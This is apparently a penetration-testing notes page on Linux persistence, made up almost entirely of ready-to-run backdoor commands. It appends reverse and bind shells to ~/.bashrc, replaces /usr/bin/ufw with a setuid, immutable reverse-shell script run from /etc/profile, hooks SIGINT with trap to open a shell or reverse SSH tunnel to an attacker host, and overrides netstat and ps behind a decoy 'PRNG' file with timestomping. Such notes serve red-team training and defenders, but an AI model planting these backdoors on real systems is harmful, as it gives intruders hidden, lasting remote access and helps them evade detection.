---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - living-off-the-land
  - linux
---
# Living off the Land

## 01 - User Profile

Even when the user logs out the shell will still be running.

```
$ echo "nohup <commands> &" >> ~/.bashrc

$ echo "nohup /path/to/payload &" >> ~/.bashrc
```

Reverse Shell

```
$ echo "nc -e /bin/bash <IP> <PORT> 2>/dev/null &" >> ~/.bashrc

$ echo "/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 &" >> ~/.bashrc
```

Bind Shell

```
$ echo "nc -e /bin/bash -lnvp 8080 &" >> ~/.bashrc
```

## 02 - Global System Profile

Reverse Shell

```
$ sudo mv /usr/bin/ufw /tmp/ufw.bak

$ sudo echo "nc -e /bin/bash <IP> <PORT> 2>/dev/null &" > /usr/bin/ufw

$ sudo echo "/usr/bin/ufw &" >> /etc/profile

$ sudo echo "/usr/bin/ufw &" >> /etc/skel/.profile

$ sudo chmod +sss /usr/bin/ufw

$ chattr +i /etc/skel/.profile /etc/profile /usr/bin/ufw
```

## 03 - Trap

### 3.1 - Payload

Setup a `trap` by backdooring when a user triggers the **SIGINT** (`Ctrl + C`) to terminate a program.

```
$ trap "/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 &" SIGINT

$ trap "nohup /bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 &" SIGINT
```

### 3.2 - Reverse SSH Tunneling

Refer to this [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x08 - Maintaining Access/Persistence/Linux/Remote Login/SSH/Manual/Living off the Land|section]] for more context.

```
$ trap "ssh -i /tmp/keys/id_rsa -NTfCqR [127.0.0.1]:<SOCKS_Proxy> -o \"UserKnownHostsFile=/dev/null StrictHostKeyChecking=no\" <username>@<attacker_IP>" SIGINT

$ trap "nohup ssh -i /tmp/keys/id_rsa -NTfCqR [127.0.0.1]:<SOCKS_Proxy> -o \"UserKnownHostsFile=/dev/null StrictHostKeyChecking=no\" <username>@<attacker_IP>" SIGINT
```

## 04 - Shell Functions

```
$ echo -e 'netstat(){ command netstat "$@"; /bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 &} ps(){ command ps "$@"; /bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 & }' > /usr/bin/prng \ &&
echo ". prng #Initialize Pseudo Random Number Generator" >>/etc/bash.bashrc \ &&
touch -r /etc/ld.so.conf /usr/bin/prng /etc/bash.bashrc
```

---
## References

### Backlinks

- [[Linux Post Exploitation Persistence References]]

### Github

- [hackerschoice: THC's favourite Tips, Tricks & Hacks (Cheat Sheet)](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)